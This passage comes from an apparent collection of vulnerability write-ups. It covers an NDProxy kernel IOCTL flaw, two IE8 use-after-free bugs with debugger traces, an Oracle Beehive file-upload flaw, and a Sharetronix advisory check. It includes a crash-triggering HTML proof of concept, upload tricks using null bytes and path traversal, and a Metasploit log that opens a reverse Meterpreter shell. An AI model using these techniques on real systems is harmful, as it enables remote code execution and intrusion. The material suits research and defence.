8fff23cc 0012ff28 0x7c801675\n 0012ff80 004012e9 00000001 00380fc0 00381058 0x4010c2\n 0012ffc0 7c817067 00241fe4 0012f7bc 7ffde000 0x4012e9\n 0012fff0 00000000 00,401,200 00000000 78746341 0x7c817067\n ```\n\nBy using IDA io_code locate handler gPxIODispatch:\n\n```\nif (v7 == 0x8FFF23C8 | | v7 == 0x8FFF23CC )\n    {\n      V17 = LockState ;\n      if (LockState <0x24 | | V6 <0x24)\n      {\n        v8 = - 1,073,741,820 ;\n         GOTO LABEL_70 ;\n      }\n      v18 = * (_DWORD *) (v5 + 20 ) - 117637377 ;\n       v36 = 36 ;\n       if ((unsigned int ) v18 <= 0x24)\n```\n\nRestart, and then off to the next handler:\n\n```\nkd> bp NDProxy! PxIODispatch\nkd> BL\n0 e f888ce92 0001 (0001) NDProxy! PxIODispatch\nkd> g\n```\n\nRun poc, program interrupt handler entrance,\nReferring ida\n\n```\nv36 = 0 ;\n   v2 = LockState ;\n   v3 = * (_DWORD *) (LockState + 0x60) ;\n   v4 = * (_BYTE *) v3 == 14 ;\n   v5 = * (_DWORD *) (LockState + 0xC) ;/ / LockState + 0xC exactly InBuf pointer\n   LockState = * (_DWORD *) (v3 + 8 ) ;\n   V6 = * (_DWORD *) (v3 + 4 ) ;\n   v35 = * (_DWORD *) (v3 + 4 ) ;\nkd> dd esp\nb20b5c38 804ef129 8212b488 81b28ce8 806d32d0\nb20b5c48 80575dde 81b28d58 81ace8a8 81b28ce8\nb20b5c58 b20b5d00 80576c7f 8212b488 81b28ce8\nb20b5c68 81ace8a8 0012ff00 b20b5d01 b20b5d01\nb20b5c78 00000002 b20b5d64 0012fe80 8056f4c2\nb20b5c88 80545edc 0012019f 00000000 00000003\n00000012 c0100080 b20b5c98 8218aa28 00000e3c\nb20b5ca8 00000000 00000e40 00000000 81ace8ec\nkd> dd 81b28ce8 +0 XC\n81b28cf4 8212d490 8218ac38 8218ac38 00000000\n00000000 01010001 0c000000 81b28d04 0012fe8c\n81b28d14 00000000 00000000 00000000 00000000\n00000000 00000000 00000000 81b28d24 0012ff28\n81b28d34 8218aa28 00000000 00000000 00000000\n00000000 81b28d58 81ace8a8 81b28d44 00000000\n81b28d54 00000000 0005000e 00000024 00000054\n00000000 8212b488 81ace8a8 81b28d64 8fff23cc\nkd> dd 8212d490\n8212d490 00000000 00000000 00000000 00000000\n00000000 07030125 00000000 00000034 8212d4a0\n8212d4b0 00000000 00000000 00000000 00000000\n00000000 00000000 00000000 00000000 8212d4c0\n8212d4d0 00000000 00000000 00000000 00000000\n8212d4e0 00000000 00000000 0001000c 81ecdbf0\n8212d4f0 0a060001 ee657645 00000001 00000001\n00000000 81e55408 00000000 821b6980 8212d500\n```\n\nLook directly handle iocode places:\n\n```\nif (M_iocode == 0x8FFF23C8 | | M_iocode == 0x8FFF23CC )\n    {\n      V17 = LockState;\n       if (LockState < 0x24 | | V6 < 0x24 )\n      {\n        v8 = 0xC0000004u ;\n         GOTO LABEL_70;\n      }\n      v18 = * (_DWORD *) (v5 + 0x14 ) - 0x7030101 ;/ / v5 +0 x14 == 0x7030125\n      v36 = 36 ;\n       if ((unsigned int ) v18 <= 0x24 ) == 0x24 v18\n      {\n        v19 = * (_DWORD *) (v5 + 0x1c ); / / v19 = 0x34\n        v20 = 3 * v18;\n        v21 = v19 < dword_F8892004 [v20] ;/ / dword_F8892004 [v20] is exactly equal to 0x34\n        LockState = v20 * 4 ;/ / v5 is assigned here\n         if (v21 | | v19> V17 - 32 ) / / skip this if\n        {\n          * (_DWORD *) (V5 + 16 ) = 0xC0012019u ;\n        }\n        else / / enter here\n        {\n          V22 = KfAcquireSpinLock (& SpinLock);\n          byte_F8892740 = V22;\n           if (TspCB)\n          {\n            LOBYTE (v23) = V22;\n            KfReleaseSpinLock ( & SpinLock, v23);\n            * (_DWORD *) (v5 + 16 ) = 4097 ;\n          }\n          else\n          {\n            + + dword_F8892734;\n             if ((unsigned int ) dword_F8892734> 0xFFFFFFFE )\n              dword_F8892734 = - 2147483647 ;\n            * (_DWORD *) (v5 + 12 ) = dword_F8892734;\n            * (_DWORD *) (v5 + 8 ) = v2;\n            LOBYTE (v23) = byte_F8892740;\n            KfReleaseSpinLock ( & SpinLock, v23);\n            * (_BYTE *) (* (_DWORD *) (v2 + 96 ) + 3 ) | = 1u ;\n            V24 = (* ( int (__ stdcall **) ( int )) (( char *) & off_F8892008 + LockState)) (v5) ;/ / here exception of\n             if (V24 == 259 )\n               return 259 ;\n            v36 = v35;\n             if (v35> = * (_DWORD *) (v5 + 28 ) + 36 )\n              v36 = * (_DWORD *) (v5 + 28 ) + 36 ;\n            * (_DWORD *) (v5 + 16 ) = V24;\n            _InterlockedExchange ((Signed __ Int32 *) (v2 + 56 ), 0 );\n          }\n        }\n      }\n```\n\nassembler code is as follows:\n\n```\ntext: F885D0AD loc_F885D0AD:; CODE XREF: PxIODispatch (x, x) +20 D J\n. text: F885D0AD mov ecx, [ESI +1 Ch] / / ESI +1 c controllable\ntext: F885D0B0 lea eax, [eax + eax * 2. ] / / eax controllable\ntext:. F885D0B3 shl eax, 2\ntext:. F885D0B6 cmp ecx, dword_F8862004 [eax]\ntext:. F885D0BC mov dword ptr [ebp + LockState.LockState], eax / / pollution LockState.LockState\ntext.: F885D0BF JNB short loc_F885D0CD\n. text: F885D0C1\ntext: F885D0C1 loc_F885D0C1:;. CODE XREF: PxIODispatch (x, x) +240 J\ntext: F885D0C1 mov dword ptr [ESI +10 h], 0C0012019h.\ntext: F885D0C8 jmp loc_F885D172.\n...\n. Text: mov eax F885D134, [ebx +60 h]\ntext:. F885D137 or byte ptr [eax +3], 1\ntext:. F885D13B mov eax, dword ptr [ebp + LockState.LockState] / / pollution eax\ntext:. F885D13E PUSH ESI\n. text: F885D13F Call off_F8862008 [eax]; Exception!\nContaminated eax as an array subscript off_F8862008 passed to the eip.\nkd> g\nBreakpoint 2 HIT\nNDProxy PxIODispatch +0 x2ad:!\n! f885d13f ff90082086f8 Call dword ptr NDProxy TapiOids +0 x8 (f8862008) [eax]\nkd> r\neax = 000001B0 ecx = 00000000 ebx = 81e2c2f8 edx = 00000000 ESI = 81cc9368 edi = f886273c\neip = f885d13f esp = b1bd9c1c ebp = b1bd9c34 iopl up EI pl = 0 NV NZ Na PO NC\ncs = 0008 SS = 0010 DS = 0023 es = 0023 fs = 0030 GS = 0000 efl = 00000202\nNDProxy PxIODispatch +0 x2ad:!\nf885d13f ff90082086f8 Call dword ! ptr NDProxy TapiOids +0 x8 (f8862008) [eax] ds: 0023: f88621b8 = 00000038\n```\n\nHere eax = 0x1b0 ie 0x24 * 3 * 4\n\nAs for how not to good use, can now expect to be able to control the array eax certain locations\nto perform shellcode.\n",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "c3e76859-8353-4e21-93b1-a026fad46b88",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "d8049635-0b6a-42d4-a516-3f61bf8bb5d7",
      "created": "2019-09-12T18:07:17.292765Z",
      "revisionDate": "2020-10-19T22:58:53.020071Z",
      "document": "-- Allocating 0x4C bytes from InsertElementInternal: 0x0563cfb0\n```\n\nIn 0x0563cfb0, offset+0 holds a reference to a mshtml!CGenericElement::`vftable':\n\n```\neax=037cc598 ebx=037cc548 ecx=04a48d10 edx=633b5f09 esi=070eefa0 edi=037cc538\neip=633b5f09 esp=037cc4f8 ebp=037cc55c iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\njscript!JsAtan2:\n633b5f09 8bff            mov     edi,edi\n0:008> dc 0x0563cfb0; .echo; dc poi(0x0563cfb0)\n0563cfb0  06a99fc8 00000000 ffff0075 ffffffff  ........u.......\n0563cfc0  00000071 00000000 00000000 00000000  q...............\n0563cfd0  00000000 0563cfd8 00000152 00000001  ......c.R.......\n0563cfe0  00000000 00000000 0563cfc0 00000000  ..........c.....\n0563cff0  00000010 00000000 00000000 d0d0d0d0  ................\n0563d000  ???????? ???????? ???????? ????????  ????????????????\n0563d010  ???????? ???????? ???????? ????????  ????????????????\n0563d020  ???????? ???????? ???????? ????????  ????????????????\n\n06a99fc8  635db4c8 00000001 00000008 07018fe8  ..]c............\n06a99fd8  049e8d80 00000000 80000075 80010000  ........u.......\n06a99fe8  00000006 0580afe8 06d9efec 00000000  ................\n06a99ff8  00000000 00000000 ???????? ????????  ........????????\n06a9a008  ???????? ???????? ???????? ????????  ????????????????\n06a9a018  ???????? ???????? ???????? ????????  ????????????????\n06a9a028  ???????? ???????? ???????? ????????  ????????????????\n06a9a038  ???????? ???????? ???????? ????????  ????????????????\n0:008> !heap -p -a poi(0x0563cfb0)\n    address 06a99fc8 found in\n    _DPH_HEAP_ROOT @ 151000\n    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)\n                                 5087390:          6a99fc8               38 -          6a99000             2000\n          mshtml!CGenericElement::`vftable'\n    7c918f01 ntdll!RtlAllocateHeap+0x00000e64\n    635db42e mshtml!CGenericElement::CreateElement+0x00000018\n    635a67f5 mshtml!CreateElement+0x00000043\n    637917c0 mshtml!CMarkup::CreateElement+0x000002de\n    63791929 mshtml!CDocument::CreateElementHelper+0x00000052\n    637918a2 mshtml!CDocument::createElement+0x00000021\n    635d3820 mshtml!Method_IDispatchpp_BSTR+0x000000d1\n    636430c9 mshtml!CBase::ContextInvokeEx+0x000005d1\n    63643595 mshtml!CBase::InvokeEx+0x00000025\n    63643832 mshtml!DispatchInvokeCollection+0x0000014b\n    635e1cdc mshtml!CDocument::InvokeEx+0x000000f1\n    63642f30 mshtml!CBase::VersionedInvokeEx+0x00000020\n    63642eec mshtml!PlainInvokeEx+0x000000ea\n    633a6d37 jscript!IDispatchExInvokeEx2+0x000000f8\n    633a6c75 jscript!IDispatchExInvokeEx+0x0000006a\n    633a9cfe jscript!InvokeDispatchEx+0x00000098\n```\n\n\nHowever, after garbage collecting, mshtml!CGenericElement::`vftable' is freed:\n\n```\neax=037cc598 ebx=037cc548 ecx=04a48d10 edx=633b5f09 esi=070eefa0 edi=037cc538\neip=633b5f09 esp=037cc4f8 ebp=037cc55c iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\njscript!JsAtan2:\n633b5f09 8bff            mov     edi,edi\n0:008> !heap -p -a poi(0x0563cfb0)\n    address 06a99fc8 found in\n    _DPH_HEAP_ROOT @ 151000\n    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)\n                                    5087390:          6a99000             2000\n    7c927553 ntdll!RtlFreeHeap+0x000000f9\n    636b52c6 mshtml!CGenericElement::`vector deleting destructor'+0x0000003d\n    63628a50 mshtml!CBase::SubRelease+0x00000022\n    63640d1b mshtml!CElement::PrivateRelease+0x00000029\n    6363d0ae mshtml!PlainRelease+0x00000025\n    63663c03 mshtml!PlainTrackerRelease+0x00000014\n    633a10b4 jscript!VAR::Clear+0x0000005c\n    6339fb4a jscript!GcContext::Reclaim+0x000000ab\n    6339fd33 jscript!GcContext::CollectCore+0x00000113\n    63405594 jscript!JsCollectGarbage+0x0000001d\n    633a92f7 jscript!NameTbl::InvokeInternal+0x00000137\n    633a6650 jscript!VAR::InvokeByDispID+0x0000017c\n    633a9c0b jscript!CScriptRuntime::Run+0x00002989\n    633a5ab0 jscript!ScrFncObj::CallWithFrameOnStack+0x000000ff\n    633a59f7 jscript!ScrFncObj::Call+0x0000008f\n    633a5743 jscript!CSession::Execute+0x00000175\n\n\n0:008> dc 0x0563cfb0; .echo; dc poi(0x0563cfb0)\n0563cfb0  06a99fc8 00000000 ffff0075 ffffffff  ........u.......\n0563cfc0  00000071 00000000 00000000 00000000  q...............\n0563cfd0  00000000 0563cfd8 00000152 00000001  ......c.R.......\n0563cfe0  00000000 00000000 0563cfc0 00000000  ..........c.....\n0563cff0  00000010 00000000 00000000 d0d0d0d0  ................\n0563d000  ???????? ???????? ???????? ????????  ????????????????\n0563d010  ???????? ???????? ???????? ????????  ????????????????\n0563d020  ???????? ???????? ???????? ????????  ????????????????\n\n06a99fc8  ???????? ???????? ???????? ????????  ????????????????\n06a99fd8  ???????? ???????? ???????? ????????  ????????????????\n06a99fe8  ???????? ???????? ???????? ????????  ????????????????\n06a99ff8  ???????? ???????? ???????? ????????  ????????????????\n06a9a008  ???????? ???????? ???????? ????????  ????????????????\n06a9a018  ???????? ???????? ???????? ????????  ????????????????\n06a9a028  ???????? ???????? ???????? ????????  ????????????????\n06a9a038  ???????? ???????? ???????? ????????  ????????????????\n```\n\nYou can see that the reference is still there.  When the page reloads, this ends up with a crash:\n\n```\n0:008> g\n(5f4.2c0): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=63aae200 ebx=0563cfb0 ecx=06a99fc8 edx=00000000 esi=037cf0b8 edi=00000000\neip=6363fcc4 esp=037cf08c ebp=037cf0a4 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246\nmshtml!CElement::Doc:\n6363fcc4 8b01            mov     eax,dword ptr [ecx]  ds:0023:06a99fc8=????????\n```\n\nCallstack at the time of the crash:\n\n```\n0:008> k\nChildEBP RetAddr\n037cf1f8 63602718 mshtml!CElement::Doc\n037cf214 636026a3 mshtml!CTreeNode::ComputeFormats+0xb9\n037cf4c0 63612a85 mshtml!CTreeNode::ComputeFormatsHelper+0x44\n037cf4d0 63612a45 mshtml!CTreeNode::GetFancyFormatIndexHelper+0x11\n037cf4e0 63612a2c mshtml!CTreeNode::GetFancyFormatHelper+0xf\n037cf4f0 63717f30 mshtml!CTreeNode::GetFancyFormat+0x35\n037cf4fc 63717f4e mshtml!ISpanQualifier::GetFancyFormat+0x5a\n037cf50c 63717afe mshtml!SLayoutRun::HasInlineMbp+0x10\n037cf51c 63724f88 mshtml!SRunPointer::HasInlineMbp+0x53\n037cf554 6373a5a1 mshtml!CLayoutBlock::GetIsEmptyContent+0xf1\n037cf58c 6382ed01 mshtml!CLayoutBlock::GetIsEmptyContent+0x3f\n037cf5d8 63702e23 mshtml!CBlockContainerBlock::BuildBlockContainer+0x250\n037cf610 63708acf mshtml!CLayoutBlock::BuildBlock+0x1c1\n037cf6d4 6370bd31 mshtml!CCssDocumentLayout::GetPage+0x22a\n037cf844 63668184 mshtml!CCssPageLayout::CalcSizeVirtual+0x242\n037cf97c 6368a1cb mshtml!CLayout::CalcSize+0x2b8\n037cfa78 6374799d mshtml!CLayout::DoLayout+0x11d\n037cfa8c 636514de mshtml!CCssPageLayout::Notify+0x140\n037cfa98 636678c6 mshtml!NotifyElement+0x41\n```\n\nPatch information:\n\nPatch:\nDo a mshtml!CLayoutBlock::RemoveChild in mshtml!CBlockContainerBlock::BuildBlockContainer before\nthe layout structure access.  More information about this patch can be found here:\n\nhttps://blogs.technet.com/b/srd/archive/2013/05/08/microsoft-quot-fix-it-quot-available-to-mitigate-internet-explorer-8-vulnerability.aspx?Redirected=true\n",
      "score": 2,
      "metadata": {},
      "tags": []
    },
    {
      "id": "b196d93a-0c41-4bc9-ac92-ebfcf15d966c",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "30452b6b-7fdb-43ae-a26c-7af426287520",
      "created": "2019-09-12T18:07:18.111065Z",
      "revisionDate": "2020-02-13T17:12:18.027636Z",
      "document": "\n\n[Oracle Beehive](http://www.oracle.com/technetwork/middleware/beehive/overview/index.html) suffers from a vulnerability that allows a remote attacker to upload a malicious\nfile, and execute it under the context of SYSTEM. Authentication is not required to exploit this\nvulnerability.\n\nThe ```prepareAudioToPlay()``` function found in voice-servlet is meant to be used to prepre for an\nwav file upload, such as creating the base path, a session file, etc. The session file creation can\nbe abused via the playAudioFile.jsp page to upload anything we want without any security checks.\n\nThis bug was found while reviewing mr_me's Oracle Beehive exploit privately submitted to me, which\nalso exploits the same type of problem in the same voice-servlet, but different function\n(```processEvaluation```). I asked mr_me about the ```prepareAudioToPlay()``` one, and turns out he already\nreported it to ZDI, so I took no additional steps for disclosure. I was still credited for the\noverlapped finding anyway.\n\nThis bug is scheduled for public disclosure on Oct 28, 2015 (ZDI-CAN-3004).\n\n## Tested & Analyzed Versions\n\nOracle Beehive 2.0.1.0.0\n\n## Code Analysis\n\nThe vulnerable function (```prepareAudioToPlay```) can be found at the following location:\nC:\\oracle\\product\\2.0.1.0.0\\beehive_2\\BEEAPP\\applications\\voice-servlet\\voice-servlet\\prompt-qa\\Include.jspf\n\nThe Include.jspf file serves more like a library for the whole servlet. First off, it retrieves and\ninitializes the following parameters:\n\n```java\n  // Global parameters\n  String sessionNumber = request.getParameter(\"sess\");\n  String recxml        = request.getParameter(\"recxml\");\n  String wavFile       = request.getParameter(\"wavfile\");\n  String prevwavFile   = request.getParameter(\"prevwavfile\");\n  String audiopath     = request.getParameter(\"audiopath\");\n  String evaluation    = request.getParameter(\"evaluation\");\n  String testaudiopath = \"testaudio\";\n  //\n  prevwavFile = prevwavFile != null && prevwavFile.equalsIgnoreCase(\"null\") ? null :\n                prevwavFile;\n  // Setup other local variables\n  ServletContext context    = pageContext.getServletContext();\n  String currDirectory      = context.getRealPath(\"\") + File.separator + \"prompt-qa\";\n  String resultsDirectory   = currDirectory + File.separator + \"results\";\n  String sessionsDirectory  = currDirectory + File.separator + \"sessions\";\n  String recxmlDirectory    = currDirectory + File.separator + \"recxmls\";\n  String testDirectory      = currDirectory + File.separator + testaudiopath;\n\n  //\n  // Styles\n  //\n  .... skipping styles code because not important for our vulnerability ....\n\n  //\n  // Initialize the session number and audio path\n  //\n  sessionNumber   = generateSessionNumber(sessionNumber, sessionsDirectory);\n  audiopath       = audiopath == null ? getAudioPath(recxml) : audiopath;\n```\n\nAnd then here's our vulnerable function. For the arguments required, we have direct control of:\n\n* audiopath - this gives us control of the file path of a fastCopy function.\n* recxml    - this gives us control of the sess file content.\n* wavFile   - this gives us control of how the servlet builds the base path.\n* sessionNumber - this gives us control of the sess file name.\n\nAt the end of the function is the FileOutputStream code we can abuse to upload malicious data\nto the web server.\n\n```java\n  public void prepareAudioToPlay (String audiopath,\n                                  String recxml,\n                                  String wavFile,\n                                  String sessionsDirectory,\n                                  String sessionNumber,\n                                  String currDirectory,\n                                  String testDirectory,\n                                  String testaudiopath) {\n    //\n    // Build the base path for the new audio file.\n    //\n\n    if (wavFile.indexOf(File.separator) != -1) {\n      String base = wavFile.substring(0, wavFile.indexOf(File.separator));\n      File   dir  = new File(testDirectory + File.separator +\n                             recxml + File.separator + base);\n      dir.mkdirs();\n    }\n    //\n    // Copy the file to test to the testaudio directory and give it a\n    // unique name.\n    //\n    int    index      = 0;\n    String newWavFile = wavFile.substring(0,wavFile.length()-4) + \"_\" + index + \".wav\";\n    File   fout       = null;\n    try {\n      fout = new File(testDirectory + File.separator +\n                      recxml + File.separator + newWavFile);\n      // Generate a unique output file.\n      while (fout.exists()) {\n        index++;\n        newWavFile = wavFile.substring(0,wavFile.length()-4) + \"_\" + index + \".wav\";\n        fout = new File(testDirectory + File.separator +\n                        recxml + File.separator + newWavFile);\n\n      }\n    } catch (Exception e) {}\n\n    File fin  = new File(currDirectory + File.separator +\n                         audiopath + wavFile);\n    fastCopy(fin, fout);\n\n    //\n    // Put the file to play in the session file.\n    //\n    File             sf  = null;\n    FileOutputStream fos = null;\n    PrintStream      ps  = null;\n    try {\n      sf  = new File(sessionsDirectory + File.separator + sessionNumber + \".sess\");\n      fos = new FileOutputStream(sf, false); // do not append\n      ps  = new PrintStream(fos);\n      ps.print(testaudiopath + \"/\" + recxml + \"/\" + newWavFile);\n      ps.close();\n      fos.close();\n    } catch (Exception e2) {}\n  }\n```\n\nSince ```prepareAudioToPlay()``` is a function, and Include.jspf does not call itself, we need to\nfind another page that does. Our ideal candidate is playAudioFile.jsp, because it calls\n```prepareAudioToPlay()``` as soon as you request it:\n\n```java\n<%@ include file=\"Include.jspf\"%>\n<%\nprepareAudioToPlay(audiopath,\n                   recxml,\n                   wavFile,\n                   sessionsDirectory,\n                   sessionNumber,\n                   currDirectory,\n                   testDirectory,\n                   testaudiopath);\n\n.... more code below but not so relevant to our bug ....\n```\n\n## Attacker's Notes\n\nThe two most important parameters are ```sess``` and ```recxml``` for the ```prepareAudioToPlay``` function.\n\nSince the ```sess``` parameter is part of the filename:\n\n```java\nsf  = new File(sessionsDirectory + File.separator + sessionNumber + \".sess\");\n```\n\nWe can inject a null byte at the end and supply our own file extension to create an arbitrary file\ntype (such as JSP). And then we can traverse our way out to a different directory, somewhere that\nallows us to call the malicious file with an HTTP request.\n\nThe ```recxml``` parameter is part of the session file content:\n\n```java\nps.print(testaudiopath + \"/\" + recxml + \"/\" + newWavFile);\n```\n\nThe ```testaudiopath``` variable, the slashes, and the ```newWavFile``` variable are junk to us, but should not\naffect our malicious code as long as we wrap the code around in a ```<% ... %>``` block.\n\nAnother thing we need is the ```wavFile``` parameter has to be at least 4 bytes long, otherwise we trigger\nthis bug in the vulnerable function, and our attack fails:\n\n```java\nString newWavFile = wavFile.substring(0,wavFile.length()-4) + \"_\" + index + \".wav\";\n```\n\n## Demonstration\n\nExploit is available as oracle_beehive_prepareaudiotoplay.rb:\n\n```\nmsf exploit(beehive) > rerun\n[*] Reloading module...\n[*] Started reverse handler on 192.168.1.64:4444\n[*] 192.168.1.109:7777 - Stager name is: blah.jsp\n[*] 192.168.1.109:7777 - Executable name is: blah.exe\n[*] 192.168.1.109:7777 - Uploading stager...\n[*] 192.168.1.109:7777 - Uploading payload...\n[*] Sending stage (882688 bytes) to 192.168.1.109\n[*] Meterpreter session 7 opened (192.168.1.64:4444 -> 192.168.1.109:2917) at 2015-05-07 02:01:54 -0500\nmeterpreter >\n```\n",
      "score": 2,
      "metadata": {},
      "tags": []
    },
    {
      "id": "f776a930-6ce7-4ac4-8184-25fa4a877415",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "8f822f76-2881-49da-a6ad-12cfd9da2407",
      "created": "2019-09-12T18:07:18.876497Z",
      "revisionDate": "2020-02-13T17:12:17.770992Z",
      "document": "\n\nAccording to the advisory: http://karmainsecurity.com/KIS-2013-11\n\n1) Input passed via the \u201cactivities_text\u201d POST parameter to /services/activities/set is not properly sanitised before being used in a call to the \u201cpreg_replace()\u201d function with the \u201ce\u201d modifier in the /system/classes/class_post.php script. This can be exploited to inject and execute arbitrary PHP code.\n\n2) Input passed via the \u201ccomments_text\u201d POST parameter to /services/comments/set is not properly sanitised before being used in a call to the \u201cpreg_replace()\u201d function with the \u201ce\u201d modifier in the /system/classes/class_postcomment.php script. This can be exploited to inject and execute arbitrary PHP code.\n\n\nAnd: No official solution is currently available (at the time of advisory publication).\n\nDownloaded Sharetronix 3.1.1 from the official website and found it:\n\n* class_postcomment.php\n\n```\n$message\t= htmlspecialchars($this->comment_message);\n\nif( FALSE!==strpos($message,'http://') || FALSE!==strpos($message,'http://') || FALSE!==strpos($message,'ftp://') ) {\n\t$message\t= preg_replace('#(^|\\s)((http|https|ftp)://\\w+[^\\s\\[\\]]+)#ie', 'post::_postparse_build_link(\"\\\\2\", \"\\\\1\")', $message);\n}\n```\n\n\n* class_post.php\n\n```\n$message\t= htmlspecialchars($this->post_message);\nif( FALSE!==strpos($message,'http://') || FALSE!==strpos($message,'http://') || FALSE!==strpos($message,'ftp://') ) {\n\t$message\t= preg_replace('#(^|\\s)((http|https|ftp)://\\w+[^\\s\\[\\]]+)#ie', 'post::_postparse_build_link(\"\\\\2\", \"\\\\1\")', $message);\n}\n```\n\nUnfortunately, in both cases, htmlspecialchars is called over $this->comment_message or $this->post_message, so, evenwhen the preg_replace with /e flag is there, you need \" to scape, unfortunately htmlspecialchars is htmlencoding \" (double quotes).\n\nI guess it was silently patched or something like that, unfortunately, I haven't access to older versions, I can't find nothing in the vendor homepage :(\n\n\n",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "034c6b21-23f8-4a4f-b73f-cad8bb1332eb",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "b9f151bf-d837-464d-8812-b80f00740b6d",
      "created": "2019-09-12T18:07:20.321858Z",
      "revisionDate": "2020-02-13T17:12:17.52303Z",
      "document": "\n\n# Analysis\n\nIn IE8 standards mode, it's possible to cause a use-after-free condition by first creating an\nillogical table tree, where a CPhraseElement comes after CTableRow, with the final node being\na sub table element. When the CPhraseElement's outer content is reset by using either outerText\nor outerHTML through an event handler, this triggers a free of its child element (in this case,\na CAnchorElement, but some other objects apply too), but a reference is still kept in function\nSRunPointer::SpanQualifier. This function will then pass on the invalid reference to the next\nfunctions, eventually used in mshtml!CElement::Doc when it's trying to make a call to the object's\nSecurityContext virtual function at offset +0x70, which results a crash. An attacker can take\nadvantage of this by first creating an CAnchorElement object, let it free, and then replace the\nfreed memory with another fake object. Successfully doing so may allow arbitrary code execution\nunder the context of the user.\n\nThis bug is specific to Internet Explorer 8 only. It was originally discovered by Orange Tsai at\nHitcon 2013, but was silently patched in the July 2013 update (MS13-055).\n\nPoC does not trigger for the following setups:\n\n* Win XP SP3 + IE7\n* Win 7 SP1 + IE9\n\n# PoC\n\n```\n<!DOCTYPE html>\n\n<table>\n    <tr>\n        <div>\n            <span>\n                <q id='e'>\n                    <a>\n                        <td></td>\n                    </a>\n                </q>\n            </span>\n        </div>\n    </tr>\n</table>\n\n<script>\nwindow.onload = function(){\nvar x = document.getElementById('e');\nx.outerHTML = '';\n}\n</script>\n</html>\n```\n\n# DOM Tree\n\n```\nCBodyElement -> CTable -> CTableSection -> CTableRow -> CPhraseElement -> CAnchorElement -> CTableCell\n```\n\n\n# Win XP SP3 + IE8\n\n```\n.text:63717B12 ; public: class ISpanQualifier * __thiscall SRunPointer::SpanQualifier(void)const\n.text:63717B12 ?SpanQualifier@SRunPointer@@QBEPAVISpanQualifier@@XZ proc near\n...\ntext:63717B2D                 mov     eax, [eax+0Ch]\n\nAnd then this return value is passed on to GetFancyFormat:\n\n.text:6371DBC5                 call    ?SpanQualifier@SRunPointer@@QBEPAVISpanQualifier@@XZ ; SRunPointer::SpanQualifier(void)\n.text:6371DBCA                 call    ?GetFancyFormat@ISpanQualifier@@QAEPBVCFancyFormat@@_N@Z ; ISpanQualifier::GetFancyFormat(bool)\n...\n\nIn GetFancyFormat, that return value is assigned to ESI:\n.text:63717F1A                 mov     esi, eax\n.text:63717F1C                 call    ?IsTreeNodeQualifier@ISpanQualifier@@QBE_NXZ ; ISpanQualifier::IsTreeNodeQualifier(void)\n\nESI will then get assigned to ECX - \"this\" in C++:\n.text:63717F29                 mov     ecx, esi\n.text:63717F2B                 call    ?GetFancyFormat@CTreeNode@@QAEPBVCFancyFormat@@XZ ; CTreeNode::GetFancyFormat(void)\n```\n\nYou keep following ECX, eventually that leads to the crash.\n\n```\n0:008> dd ebx L30/4\n06a20fb0  06a32f98 00000000 ffff0002 ffffffff\n06a20fc0  00000011 00000000 00000000 00000000\n06a20fd0  00000000 06a20fd8 00000012 00000000\n\n\nvftable     = 06a32f98\nRef counter = 0\n\n\n0:008> !heap -p -a ebx\n    address 06a20fb0 found in\n    _DPH_HEAP_ROOT @ 151000\n    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)\n                                 653d418:          6a20fb0               4c -          6a20000             2000\n          ? <Unloaded_pi.dll>+6a32f97\n    7c918f01 ntdll!RtlAllocateHeap+0x00000e64\n    636a9a94 mshtml!CHtmRootParseCtx::OverlappedEndElement+0x00000141\n    636a99d3 mshtml!CHtmRootParseCtx::EndElement+0x000000cb\n    635a8ee4 mshtml!CHtmTextParseCtx::EndElement+0x0000006e\n    635a71eb mshtml!CHtmParse::EndElement+0x0000007b\n    6359f47c mshtml!CHtmParse::CloseContainer+0x000001c5\n    635bf441 mshtml!CHtmParse::CloseAllContainers+0x00000026\n    635a941d mshtml!CHtmParse::PrepareContainer+0x0000007f\n    635a933f mshtml!CHtmParse::ParseBeginTag+0x00000028\n    635a6bb6 mshtml!CHtmParse::ParseToken+0x00000082\n    635a7ff4 mshtml!CHtmPost::ProcessTokens+0x00000237\n    635a734c mshtml!CHtmPost::Exec+0x00000221\n    635ac2b8 mshtml!CHtmPost::Run+0x00000015\n    635ac21b mshtml!PostManExecute+0x000001fd\n    635ac17e mshtml!PostManResume+0x000000f8\n    635ac0e2 mshtml!CHtmPost::OnDwnChanCallback+0x00000010\n\n\n\n0:008> !heap -p -a ecx\n    address 06a32f98 found in\n    _DPH_HEAP_ROOT @ 151000\n    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)\n                                    653d6c0:          6a32000             2000\n    7c927553 ntdll!RtlFreeHeap+0x000000f9\n    637e06f2 mshtml!CAnchorElement::`vector deleting destructor'+0x00000028\n    63628a50 mshtml!CBase::SubRelease+0x00000022\n    63625df6 mshtml!CElement::PrivateExitTree+0x00000011\n    635c5ef1 mshtml!CMarkup::SpliceTreeInternal+0x00000083\n    635c84e3 mshtml!CDoc::CutCopyMove+0x000000ca\n    635c9264 mshtml!CDoc::Remove+0x00000018\n    635c92e9 mshtml!RemoveWithBreakOnEmpty+0x0000003a\n    63742f86 mshtml!CElement::InjectInternal+0x0000032a\n    635c9415 mshtml!CElement::InjectCompatBSTR+0x00000046\n    638bb56b mshtml!CElement::put_outerText+0x00000025\n    6366906f mshtml!GS_BSTR+0x000001ab\n    636430c9 mshtml!CBase::ContextInvokeEx+0x000005d1\n    6366418a mshtml!CElement::ContextInvokeEx+0x0000009d\n    6362b6ce 